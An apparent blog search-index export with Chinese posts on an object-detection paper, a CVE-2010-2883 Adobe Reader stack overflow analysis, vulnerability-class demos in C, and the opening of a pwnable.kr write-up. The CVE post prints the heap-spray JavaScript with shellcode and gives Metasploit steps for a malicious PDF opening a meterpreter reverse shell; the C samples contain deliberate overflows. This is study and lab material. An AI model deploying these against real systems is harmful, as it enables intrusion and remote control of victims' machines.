<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Object detection with location-aware deformable convolution and backward attention filtering]]></title>
    <url>%2F2021%2F03%2F17%2FObject%20detection%20with%20location-aware%20deformable%20convolution%20and%20backward%20attention%20filtering%2F</url>
    <content type="text"><![CDATA[在本文中，提出了一种位置感知的可变形卷积和后向注意滤波，以提高检测性能。可感知位置的可变形卷积通过从存在信息上下文的地方对输入进行采样来提取不均匀分布的上下文特征。后向注意过滤模块通过突出信息性特征并使用来自深层的语义特征抑制干扰性特征来过滤高分辨率特征图。从主干神经网络backbone中提取出Conv1-Conv6，从Conv3开始使用位置感知变形卷积（location-aware deformable convolution）以增强上下文信息，获得增强的Conv3，Conv4，Conv5。在向后传递的过程中，有三个后向注意过滤模块（backwardattention filtering），每个模块都使用前一个模块的输出来过滤输入特征映射，三个经过过滤的特征映射被输入到区域生成网络（RPN），经过skip pooling整合然后进行分类预测。一般的可变形卷积，只有一个基于标准卷积相同感受野的卷积层来预测所有的偏移。可是使用相同感受野以及卷积层对每个输入样本进行偏移预测可能无法获得最优的结果；此外，感受野太小在偏移预测时不能查看周围的特征，也使其不能捕获有用的上下文信息。其中I为输入特征，O为输出特征，D为膨胀率，pn为相对于中心的位置变化，Δn为偏移；如上图所示，首先使用1×1的卷积来压缩通道至64，经过1×1卷积，9个3×3卷积层Cn, n∈{0,1，，，8}用于估计每个输入样本的偏移量卷积层Cn位于pc+D·pn。因此，每个输入样本的偏移估计是由其位置和独特的环境决定的；之后由于预测的偏移通常是小数，使用插值以获得对应的特征值，最后计算加权和得到最终输出。Location-aware deformable convolution的目的是为了获得更丰富的上下文信息，得到的结果需要与标准卷积的结果一起处理，将两者连接起来，然后使用1×1卷积压缩到原来的通道数组成最终的输出特征。反向注意过滤模块的架构如图5所示。注意过滤模块有两个输入，一个是待过滤的目标特征图T，另一个是更深卷积层的语义特征图S，用来生成注意图。将上层语义信息使用3×3卷积后进行sigmoid激活，作为注意力，然后上采样（Aup）到对应大小与当前层特征相乘。 使用相同backbone与faster R-CNN间的效果对比。使用两个backbone，本文的方法效果对比Faster R-CNN均有较大的提高，最高分别提升2.9与3.4个点。每个模块的使用也都有相应的提升。其中(a)为仅使用location-aware deformable convolution，(b)仅使用backward attention filtering，(c)同时使用两个模块。 Location-aware deformable convolution模块与一般的convolution以及deformable convolution间的对比，同时对比了不同膨胀率的结果。最优的结果是使用膨胀率为2的膨胀卷积。 与其他使用attention机制的方法的对比。本文提出的backward attention filtering的效果最佳。 本文结果与其他方法的对比。本文提出的虽不至于在效果上达到最优，但是均衡了速度与性能。]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[栈溢出漏洞分析：CVE-2010-2883 Adobe Reader TTF字体SING表栈溢出漏洞]]></title>
    <url>%2F2021%2F03%2F14%2F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9ACVE-2010-2883%20Adobe%20Reader%20TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[1、漏洞描述CVE-2010-2883是Adobe Reader和Acrobat中的CoolType.dll库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞，用户受骗打开了特制的PDF文件就有可能导致执行任意代码。 2、分析环境操作系统：Windows XP SP3虚拟机：VMware 15.2调试器：OllyDbg反汇编器：IDA Pro漏洞软件：Adobe Reader 9.3.4 3、定位漏洞位置用IDA打开CoolType.dll库，查看字符串，找到“SING”字体，该字符串是漏洞解析出错的地方，直接定位进去查看该库对sing表格的解析方式，主要是strcat造成的溢出漏洞： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152.text:0803DCF9 push ebp.text:0803DCFA sub esp, 104h.text:0803DD00 lea ebp, [esp-4].text:0803DD04 mov eax, ___security_cookie.text:0803DD09 xor eax, ebp.text:0803DD0B mov [ebp+108h+var_4], eax.text:0803DD11 push 4Ch.text:0803DD13 mov eax, offset sub_8184A54.text:0803DD18 call __EH_prolog3_catch.text:0803DD1D mov eax, [ebp+108h+arg_C].text:0803DD23 mov edi, [ebp+108h+arg_0].text:0803DD29 mov ebx, [ebp+108h+arg_4].text:0803DD2F mov [ebp+108h+var_130], edi.text:0803DD32 mov [ebp+108h+var_138], eax.text:0803DD35 call sub_804172C.text:0803DD3A xor esi, esi.text:0803DD3C cmp dword ptr [edi+8], 3.text:0803DD40 mov [ebp+108h+var_10C], esi.text:0803DD43 jz loc_803DF00.text:0803DD49 mov [ebp+108h+var_124], esi.text:0803DD4C mov [ebp+108h+var_120], esi.text:0803DD4F cmp dword ptr [edi+0Ch], 1.text:0803DD53 mov byte ptr [ebp+108h+var_10C], 1.text:0803DD57 jnz loc_803DEA9.text:0803DD5D push offset aName ; &quot;name&quot;.text:0803DD62 push edi ; int.text:0803DD63 lea ecx, [ebp+108h+var_124].text:0803DD66 mov [ebp+108h+var_119], 0.text:0803DD6A call sub_80217D7.text:0803DD6F cmp [ebp+108h+var_124], esi.text:0803DD72 jnz short loc_803DDDD.text:0803DD74 push offset aSing ; &quot;SING&quot;.text:0803DD79 push edi ; int.text:0803DD7A lea ecx, [ebp+108h+var_12C] //指向sing表入口.text:0803DD7D call sub_8021B06.text:0803DD82 mov eax, [ebp+108h+var_12C].text:0803DD85 cmp eax, esi //判断是否为空.text:0803DD87 mov byte ptr [ebp+108h+var_10C], 2.text:0803DD8B jz short loc_803DDC4 //为空则跳转.text:0803DD8D mov ecx, [eax] //字体资源版本号，这里为1.0，即00 01 00 00.text:0803DD8F and ecx, 0FFFFh.text:0803DD95 jz short loc_803DD9F.text:0803DD97 cmp ecx, 100h.text:0803DD9D jnz short loc_803DDC0.text:0803DD9F.text:0803DD9F loc_803DD9F: ; CODE XREF: sub_803DCF9+9Cj.text:0803DD9F add eax, 10h.text:0803DDA2 push eax ; char * uniqueName域.text:0803DDA3 lea eax, [ebp+108h+var_108].text:0803DDA6 push eax ; char * 目的地址.text:0803DDA7 mov [ebp+108h+var_108], 0.text:0803DDAB call strcat //造成溢出 Adobe Reader在调用strcat时，未对uniqueName字段的字符串长度进行检测，直接复制到固定大小的栈空间，最终导致栈溢出。 4、动态调试把Adobe Reader 9.3.4载入OD，加载之后按F9运行。通过刚刚的静态分析我们了解到SING在地址0x0803DD74处被引用，因此我们可以在OD中在这个地址处下一个断点获取SING表的入口地址。Ctrl+G输入0x0803DD74回车跳转到该地址F2下断点。将样本(名企面试自助手册.pdf)拖入Adobe Reader中，程序就会停在断点处，F7单步到下面的地址。ctrl+G跳转到ecx指向的地址，对里面的数据进行查看。在分析这段数据之前我们先来看看TrueType字体格式标准文档里是怎么说的。在TrueType字体文件中，从0字节偏移的位置开始处有一个表目录。且这个表目录的第一个字段是名为sfnt version是用来表明所用ttf格式版本的字段。在文档中清楚的标注了，对于1.0版本的TTF字体文件开头要用0x00010000来表示版本。回到我们刚才0x046D41F4位置处的数据，会发现开头正好是0x00010000，这就证明了ecx保存的是一个指向ttf对象的指针地址并且在这里应该是作为this指针。接下来遇到了一个call指令，意味着即将调用一个函数。在调用函数前我们先看看这个函数传入了哪些参数。很明显它将SING字符串当作参数了。这里我们单步F8不进入call函数内部。此时eax为0x0423D438，要想知道这块数据是什么，首先用pdfStreamDumper取出PDF样本中的TTF文件。 1234567typedef struct_SING&#123; char tag[4] //标记-&gt;SING ULONG checkSum //校验和-&gt;0xD9BCCBB5 ULONG offset //相对文件的偏移-&gt;011C ULONG length //数据长度-&gt;0x1DDF&#125; 通过观察SING表中的结构我们可以知道在文件偏移0x11C处即是SING表的真实数据，Ctrl+G去到0x11C处，发现和eax所指向的0x0423D438是一致的，如图：以上的指令主要就是将SING表的tag名传入到sub_08021B06函数中通过表目录来获取到SING表的入口地址，而目前eax的值0x046BE598即是SING表的入口地址。分析SING表的这些数据，我们就能知道样本到底做了些什么。接着比较eax和esi的值，检测SING表是否为空，不为空则不跳转。接下来取出eax的内容赋给ecx，通过刚才的分析我们知道此时的ecx保存的是ttf的版本号。然后清零ecx低四位，跳转到add eax,0x10，eax保存的是SING表的入口地址，加上0x10处指向的是uniqueName域。继续单步来到strcat溢出点。这里将uniqueName域和当前的ebp入栈，然后调用strcat进行字符串拼接，但是没有进行安全检查，导致溢出，我们单步步过strcat后查看一下ebp开始的栈区数据，可以看到返回地址为icucnv36.4A82A714。此时栈溢出已经发生，函数的返回地址已经被覆盖为SING表中的恶意数据。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431440012E4D8 AD8DE0580012E4DC DA55D18A0012E4E0 4A82A714 icucnv36.4A82A7140012E4E4 0C0C0C0C0012E4E8 DF6F26060012E4EC 2787E9150012E4F0 1129D97F0012E4F4 9B7BA3070012E4F8 F9D13EFB0012E4FC F977C1F60012E500 DC7BF4160012E504 DE535B4A0012E508 CD8E69280012E50C 57E3BF180012E510 C834489B0012E514 2C6DAE690012E518 E89428E80012E51C E1C8ADFD0012E520 2A25ABF10012E524 D79004510012E528 CC1AB7750012E52C B73075D40012E530 4C7CFD590012E534 DD794F1C0012E538 4B060C6A0012E53C C6FBF0AD0012E540 0C8F4AD30012E544 E3CFD9A20012E548 15776EDC0012E54C 7C91EE9B0012E550 BBB441C00012E554 728A0B6C0012E558 9663983D0012E55C D87ED0490012E560 41C248680012E564 B73D48880012E568 7A3C39BF0012E56C 7B61D7A50012E570 E72C648D0012E574 E9F670110012E578 02409992 xpsp2res.024099920012E57C 6488953C0012E580 8B5B79770012E584 768FFC5C0012E588 D89CD8E70012E58C 2E39E4E80012E590 EA8845E70012E594 1C9108750012E598 6A6DC5A10012E59C EE8422860012E5A0 0613E3A9 AGM.0613E3A90012E5A4 D87BC5D50012E5A8 2414CF1B0012E5AC 3813B9890012E5B0 B672EE7E0012E5B4 2129C1C7 AcroForm.2129C1C70012E5B8 C2E90B310012E5BC F411EA820012E5C0 F56884C90012E5C4 9F21F2BD0012E5C8 1E3F93720012E5CC 2D694AEA0012E5D0 4324B6670012E5D4 CD7382560012E5D8 1A3FF2B70012E5DC E92FA9970012E5E0 AB5427EA0012E5E4 2909961C0012E5E8 E3754D540012E5EC B3CD70060012E5F0 9F8623100012E5F4 739F9D5F0012E5F8 A4F960240012E5FC FF0C04050012E600 EA8A6EDB0012E604 530866AA0012E608 4A8A08C6 icucnv36.4A8A08C60012E60C B69CF4E10012E610 786D1FA20012E614 B1CBA5E90012E618 940FA0E70012E61C 1F5D07370012E620 BD5C42280012E624 1597D4DB0012E628 4D0E6B790012E62C E6EE58C40012E630 CA443CC40012E634 71148AC00012E638 8F55C09A0012E63C 9280F29E0012E640 CF8079B40012E644 7BCD110F0012E648 243C0A130012E64C 12D97D8D0012E650 54176BAE0012E654 FAE1B0030012E658 2B0F18EF0012E65C 6B7B182F0012E660 2FE32E1E0012E664 1ACE5EF60012E668 FA8928950012E66C 96F0EE140012E670 AD89E2E00012E674 4A77E43C0012E678 46C2294B0012E67C 060F1BC3 AGM.060F1BC30012E680 C9A242700012E684 CA1436200012E688 DE9ECBA30012E68C 4D8B6F390012E690 FB1434A80012E694 DEBE10B80012E698 278F59DA0012E69C 5B56FD580012E6A0 EE37AEB50012E6A4 8D90D6580012E6A8 988C627A0012E6AC C0408AC00012E6B0 B13C29810012E6B4 51C2A6B10012E6B8 A24BE0AE0012E6BC 69D141AC0012E6C0 F447C59E0012E6C4 71728A520012E6C8 2ED065240012E6CC 0E5F30D50012E6D0 4A80CB38 返回到 icucnv36.4A80CB38 来自 icucnv36.4A846C490012E6D4 D72ADDAB0012E6D8 F19E30A50012E6DC D4E4768E0012E6E0 F504F59B0012E6E4 2AF6A44D0012E6E8 FF90C8040012E6EC 782C10270012E6F0 728BE6790012E6F4 D104C9D10012E6F8 B88A2B3A0012E6FC CA52A3410012E700 0F5A61470012E704 C5B9526E0012E708 BB6B35E40012E70C 47A3EB92 指向下一个 SEH 记录的指针0012E710 F7267FFE SE处理程序0012E714 0000006C 继续往下分析，我们希望了解程序到底是怎么样去读取栈区数据的。溢出发生之后继续f8调试，发现程序在指令call 08016bde之后跑飞，则推测该函数中执行漏洞利用指令，故进入该函数分析。继续f8调试，发现程序在指令call 0801BB21之后跑飞，则推测该函数中执行漏洞利用指令，故进入该函数分析。函数0801bb21中，程序在地址0801bb41处跑飞，跟进该函数。函数0801bb41中，程序在地址0808b308处跑飞，跟进该函数。f7跟进0808b308地址处的指令，发现第一个rop块，此时程序执行流程已经被改变，分析原因发现地址0x0808b308处的指令为call [eax]，此时eax为0x0012e6d0，而在strcat产生溢出的过程中，内存地址0x12e4d8之后的内存会被覆盖，所以地址0x0012e6d0处的内存可以被修改，从而产生了进程劫持的可能。这里的leave指令相当于mov esp,ebp pop ebp，该指令执行完成后栈顶被重新设置为12e4e0，该部分内存也已经被溢出覆盖，使得程序可以继续顺着rop链执行。第二个rop块是将esp设置为0c0c0c0c，漏洞利用过程中使用了堆喷射技术，通过该rop块，将栈顶修改为0c0c0c0c，从而完全掌握栈的控制权。借助PDFStreamDumper工具提取样本中这段实现堆喷射的JS代码。 123456789101112var var_shellcode = unescape( &apos;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%ub5ba%uda4b%udd0e%ud9c1%u2474%u5ef4%uc933%u31b1%u5631%u0313%u1356%uee83%ua949%uf22f%uac59%u0bd0%ud199%uee59%ud1a8%u7a3e%ue19a%u2e35%u8916%udb18%uffad%uecb4%ub506%uc3e2%ue697%u42d7%uf51b%ua50b%u3622%ua45e%u2b63%uf493%u273c%ue906%u7d49%u829b%u9301%u779b%u92d1%u298a%ucd6a%ucb0c%u65bf%ud305%u40dc%u68df%u3e16%ub8de%ubf67%u854d%u3248%uc18f%uad6e%u3bfa%u508d%ufffd%u8eec%u1b88%u4456%uc02a%u8967%u83ad%u666b%uccb9%u796f%u676e%uf28b%ua891%u401a%u6cb6%u1247%u35d7%uf52d%u26e8%uaa8e%u2c4c%ube22%u6ffc%u4128%u0a72%u411e%u158c%u2a0e%u9ebd%u2dc1%u7542%uc2a6%ud408%u4a8e%u8cd5%u1693%u7ae6%u2ed7%u8f65%ud4a7%ufa75%u91a2%u1631%u8ade%u18d7%uaa4d%u7afd%u3810%u529d%ub8b7%uab04&apos; );var var_c = unescape( &quot;%&quot; + &quot;u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; + &quot;%u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; );while (var_c.length + 20 + 8 &lt; 0x10000) var_c+=var_c;var_b = var_c.substring(0, (0x0c0c-0x24)/2);var_b += var_shellcode;var_b += var_c;var_d = var_b.substring(0, 0x10000/2);while(var_d.length &lt; 0x80000) var_d += var_d;var_3 = var_d.substring(0, 0x80000 - (0x1020-0x08) / 2);var var_4 = new Array();for (var_i=0;var_i&lt;0x1f0;var_i++) var_4[var_i]=var_3+&quot;s&quot;; 所有的ShellCode都被转化为了十六进制的转义序列，经过unescape解码之后存储在var_shellcode之中，var_c变量存储了%u0c0c%u0c0c，接下来用了一个while循环叠加var_c，用来覆盖内存的数据。采用0x0c0c0c0c作为滑板指令的原因是因为它对应的指令是or al,0x0C，这样的指令执行的效果对al寄存器不会产生任何影响接下来的var_b保存了前面是所有滑板指令以及ShellCode，最关键的实现堆喷射的语句是new Array()，利用数据来开辟内存区域，然后通过填充数据的方式来喷射ShellCode。继续调试，rop3这里借原本存“UTF-32”字符串的地方保存eax的值，然后再次返回。eax指向CreateFileA函数，疑似之后需要调用该函数。然后返回去跳转执行CreateFileA，我们直接查看CreateFileA在栈区的参数。这里以隐藏的方式创建了一个临时文件，文件名为iso88591，可以在当前样本的同路径下找到。这里会跳转到0x4A8063A5，然后将ecx赋值为4A801064，接着跳转到0x4A842DB2。交换eax和edi寄存器的值，接着跳转到0x4A802AB1。ebx为0x8，跳转到0x4A80A8A6。继续跳转。eax指向了CreateFileMappingA函数。接着用相同的方法调用CreateFileMappingA，创建文件映射对象。经过几次跳转，然后去执行MapViewOfFile，将一个文件映射对象映射到当前程序的地址空间。参数如下：然后用类似的方法去调用memcpy。将要执行的ShellCode写入到MapViewOfFile返回的地址，因为这段内存是可读可写的，所以就绕过了DEP的保护由于构造的ROP链指令均位于不受ASLR保护的icucnv32.dll模块，因此也绕过了ASLR。接着去执行ShellCode 5、漏洞复现搜索Adobe渗透模块 1msf &gt; search adobe_cooltype_sing 调用渗透模块 1msf &gt; use exploit/windows/fileformat/adobe_cooltype_sing/ 调用meterpreter载荷，反向连接到渗透机 1msf &gt; exploit(adobe_cooltype_sing) &gt; set payload windows/meterpreter/reverse_tcp 设置Kali Linux的IP地址 1msf &gt; exploit(adobe_cooltype_sing) &gt; set LHOST 192.168.1.xxx 设置本地监听端口 1msf &gt; exploit(adobe_cooltype_sing) &gt; set LPORT 8888 设置带有后门程序的PDF文件 12msf &gt; exploit(adobe_cooltype_sing) &gt; set FILENAMEcve-2010-2883.pdf 执行渗透生成文件 1msf &gt; exploit(adobe_cooltype_sing) &gt; exploit 使用handler监听模块 1msf &gt; use exploit/multi/handler 回弹一个tcp连接 1msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp 设置监听IP地址（跟PDF木马文件一致） 1msf exploit(handler) &gt; set LHOST 192.168.1.xxx 设置监听的端口（跟PDF木马文件一致） 1msf exploit(handler) &gt; set LPORT 8888 开启监听 1msf exploit(handler) &gt; exploit 查看系统信息 1meterpreter &gt; sysinfo 查看当前用户 1meterpreter &gt; getuid 截屏 1meterpreter &gt; screenshot]]></content>
      <categories>
        <category>《漏洞战争》</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二进制各种漏洞原理]]></title>
    <url>%2F2021%2F03%2F14%2F%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[1、栈溢出原理栈溢出属于缓冲区溢出的一种，有时候也称作堆栈溢出。例如下面的程序： 123456789101112131415#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main()&#123; char *str = &quot;AAAAAAAAAAAAAAAAAAAAAAAA&quot;; vulnfun(str); return;&#125;int vulnfun(char *str)&#123; char stack[10]; strcpy(stack,str); // 这里造成溢出！ &#125; 用OD加载运行：堆栈中的返回地址变成了0x41414141，即“AAAA”，由于在通过strcpy复制字符串到固定长度的堆栈空间时，未对字符串长度进行限制，导致栈溢出，最后覆盖到返回地址。 2、堆溢出原理代码： 123456789101112131415161718192021#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main ( )&#123; HANDLE hHeap; char *heap; char str[] = &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;; hHeap = HeapCreate(HEAP_GENERATE_EXCEPTIONS, 0x1000, 0xffff); getchar(); // 用于暂停程序，便于调试器加载 heap = HeapAlloc(hHeap, 0, 0x10); printf(&quot;heap addr:0x%08x\n&quot;,heap); strcpy(heap,str); // 导致堆溢出 HeapFree(hHeap, 0, heap); // 触发崩溃 HeapDestroy(hHeap); return 0;&#125; 由于调试堆和常态堆的结构不同，在演示代码中加入getchar函数，用于暂停进程，方便运行heapoverflowexe后用调试器附加进程。debug版本和release版本实际运行的进程中各个内存结构和分配过程也不同，因此测试的时候应该编译成release版本。运行程序，使用windbg附加调试（一定要附加调试），g运行后程序崩溃上面的ecx已经被“AAAA”字符串覆盖，导致程序崩溃。在字符串复制的地址对其下断点。此时堆块已经分配完成，其对应的分配地址位于0x00b504b0，0x00b504b0是堆块数据的起始地址，并非堆头信息的起始地址。对于已分配的堆块，开头都有8字节的HEAP_ENTRY结构，对于空闲堆块，它的开头是HEAP_FREE_ENTRY结构，因此heap的HEAP_ENTRY结构位于0x00b504b0-8 = 0x00b504a8。在WinDbg上查看两个堆块的信息，这两个堆块目前处于占用状态，共0x10大小的数据空间。在WinDbg中使用!heap命令查看HeapCreate创建的整个堆信息，可以发现在堆块heap之后还有个空闲堆块0x00b504c0 12345678910111213141516171819202122232425262728293031323334353637383940414243444546470:000&gt; !heap Heap Address NT/Segment Heap 760000 NT Heap 9d0000 NT Heap b50000 NT Heap0:000&gt; !heap -a 00b50000Index Address Name Debugging options enabled 3: 00b50000 Segment at 00b50000 to 00b60000 (00001000 bytes committed) Flags: 00001004 ForceFlags: 00000004 Granularity: 8 bytes Segment Reserve: 00100000 Segment Commit: 00002000 DeCommit Block Thres: 00000200 DeCommit Total Thres: 00002000 Total Free Size: 00000164 Max. Allocation Size: 7ffdefff Lock Variable at: 00b50258 Next TagIndex: 0000 Maximum TagIndex: 0000 Tag Entries: 00000000 PsuedoTag Entries: 00000000 Virtual Alloc List: 00b5009c Uncommitted ranges: 00b5008c 00b51000: 0000f000 (61440 bytes) FreeList[ 00 ] at 00b500c0: 00b504c8 . 00b504c8 00b504c0: 00018 . 00b20 [100] - free Segment00 at 00b50000: Flags: 00000000 Base: 00b50000 First Entry: 00b504a8 Last Entry: 00b60000 Total Pages: 00000010 Total UnCommit: 0000000f Largest UnCommit:00000000 UnCommitted Ranges: (1) Heap entries for Segment00 in Heap 00b50000 address: psize . size flags state (requested size) 00b50000: 00000 . 004a8 [101] - busy (4a7) 00b504a8: 004a8 . 00018 [101] - busy (10) 00b504c0: 00018 . 00b20 [100] 00b50fe0: 00b20 . 00020 [111] - busy (1d) 00b51000: 0000f000 - uncommitted bytes. 在复制字符串时，原本只有0x10大小的堆，当填充过多的字符串时就会覆盖到下方的空闲堆00b504c0，在复制前00b504c0空闲块的HEAP_FREE_ENTRY结构数据如下：覆盖后，00b504c0的空闲块的HEAP_FREE_ENTRY结构数据如下：整个空闲堆头信息都被覆盖了，包括最后的空闲链表中的前后向指针都被成了0x41414141，后面调用HeapFree释放堆块的时候，就会将buf2和后面的空闲堆块0x007104c0合并，修改两个空闲堆块的前后向指针就会引用0x41414141，最后造成崩溃。 3、整数溢出原理整数分为有符号和无符号的两种类型，有符号数以最高位作为其符号位，不同类型的整数在内存中均有不同的固定取值范围，当我们向其存储的值超过该类型整数的最大值，就会造成整数溢出。基于栈的整数溢出示例： 1234567891011121314151617181920212223242526#include &quot;stdio.h&quot;#include &quot;string.h&quot;int main(int argc, char *argv)&#123; int i; char buf[8]; // 栈缓冲区 unsigned short int size; // 无符号短整数取值范围：0 ~ 65535 char overflow[65550]; memset(overflow,65,sizeof(overflow)); // 填充为“A”字符 printf(&quot;请输入数值:\n&quot;); scanf(&quot;%d&quot;,&amp;i); size = i; printf(&quot;size：%d\n&quot;,size); // 输出系统识别出来的size数值 printf(&quot;i：%d\n&quot;,i); // 输出系统识别出来的i数据 if (size &gt; 8) return -1; memcpy(buf,overflow,i); // 栈溢出 return 0;&#125; 基于堆的整数溢出示例： 1234567891011121314151617181920212223242526272829#include &quot;stdio.h&quot;#include &quot;windows.h&quot;int main(int argc, char * argv)&#123; int* heap; unsigned short int size; char *pheap1, *pheap2; HANDLE hHeap; printf(&quot;ÊäÈësizeÊýÖµ£º\n&quot;); scanf(&quot;%d&quot;,&amp;size); hHeap = HeapCreate(HEAP_GENERATE_EXCEPTIONS, 0x100, 0xfff); if (size &lt;= 0x50) &#123; size -= 5; printf(&quot;size£º%d\n&quot;,size); pheap1 = HeapAlloc(hHeap, 0, size); pheap2 = HeapAlloc(hHeap, 0, 0x50); &#125; HeapFree(hHeap, 0, pheap1); HeapFree(hHeap, 0, pheap2); return 0;&#125; 4、格式化字符串漏洞格式化字符串漏洞的产生主要源于对用户输入内容未进行过滤，这些输入数据都是作为参数传递给某些执行格式化操作的函数，如printf、fprintf、vprintf、sprintf等。恶意用户可以使用%s和%x等个数符，从堆栈或其他内存位置输出数据，也可以使用格式符%n向任意地址写入任意数据，配合printf()函数和其他类似功能的函数就可以向任意地址写入被格式化的字节数，可能导致任意代码执行，或从漏洞程序中读取敏感信息，比如密码。示例： 123456789101112#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main (int argc, char *argv[])&#123; char buff[1024]; // 设置栈空间 strncpy(buff,argv[1],sizeof(buff)-1); printf(buff); //触发漏洞 return 0;&#125; 5、双重释放漏洞双重释放漏洞主要是由对同一块内存进行二次重复释放导致的，利用漏洞可以执行任意代码。 12345678910111213141516171819202122232425#include &lt;stdio.h&gt;#include &quot;windows.h&quot;int main (int argc, char *argv[])&#123; void *p1,*p2,*p3; p1 = malloc(100); printf(&quot;Alloc p1£º%p\n&quot;,p1); p2 = malloc(100); printf(&quot;Alloc p2£º%p\n&quot;,p2); p3 = malloc(100); printf(&quot;Alloc p3£º%p\n&quot;,p3); printf(&quot;Free p2\n&quot;); free(p2); printf(&quot;Double Free p2\n&quot;); free(p2); printf(&quot;Free p1\n&quot;); free(p1); printf(&quot;Free p3\n&quot;); free(p3); return 0;&#125; 编译执行后，在多次二次释放p2堆块后，程序崩溃。 6、释放重引用（UAF）漏洞释放重引用漏洞，顾名思义就是使用已被释放的内存，最终导致内存崩溃或任意代码执行的漏洞。示例： 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#define size 32 int main(int argc, char **argv) &#123; char *buf1; char *buf2; buf1 = (char *) malloc(size); printf(&quot;buf1：0x%p\n&quot;, buf1); free(buf1); // 分配 buf2 去“占坑”buf1 的内存位置 buf2 = (char *) malloc(size); printf(&quot;buf2：0x%p\n\n&quot;, buf2); // 对buf2进行内存清零 memset(buf2, 0, size); printf(&quot;buf2：%d\n&quot;, *buf2); // 重引用已释放的buf1指针，但却导致buf2值被篡改 printf(&quot;==== Use After Free ===\n&quot;); strncpy(buf1, &quot;hack&quot;, 5); printf(&quot;buf2：%s\n\n&quot;, buf2); free(buf2);&#125; 程序通过分配与buf1大小相等的堆块buf2实现“占坑”，使得buf2分配到已释放的buf1内存位置，但由于buf1指针依然有效，并且指向的内存数据是不可预测的，可能被堆管理器回收，也可能被其他数据占用填充，因此也被称为“悬挂指针”，借助悬挂指针buf1将其赋值为“hack”字符串，进而导致buf2也被篡改为“hack”字符串。 7、数组越界访问漏洞示例： 12345678910111213#include &quot;stdio.h&quot;int main()&#123; int index; int array[3] = &#123;0x11, 0x22, 0x33&#125;; printf(&quot;输入数组索引下标：&quot;); scanf(&quot;%d&quot;, &amp;index); printf(&quot;输出数组元素：array[%d] = 0x%x\n&quot;, index, array[index]); return 0;&#125;]]></content>
      <categories>
        <category>《漏洞战争》</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.kr - passcode]]></title>
    <url>%2F2021%2F01%2F24%2Fpwnable.kr%20-%20passcode%2F</url>
    <content type="text"><![CDATA[题目 查看源码cat passcode.c 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf(&quot;enter passcode1 : &quot;); scanf(&quot;%d&quot;, passcode1); // 这里有警告 fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(&quot;enter passcode2 : &quot;); scanf(&quot;%d&quot;, passcode2); // 这里有警告 printf(&quot;checking...\n&quot;); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123; printf(&quot;Login OK!\n&quot;); system(&quot;/bin/cat flag&quot;); &#125; else&#123; printf(&quot;Login Failed!\n&quot;); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf(&quot;enter you name : &quot;); scanf(&quot;%100s&quot;, name); printf(&quot;Welcome %s!\n&quot;, name);&#125;int main()&#123; printf(&quot;Toddler&apos;s Secure Login System 1.0 beta.\n&quot;); welcome(); login(); // something after login... printf(&quot;Now I can safely trust you that you have credential :)\n&quot;); return 0; &#125; 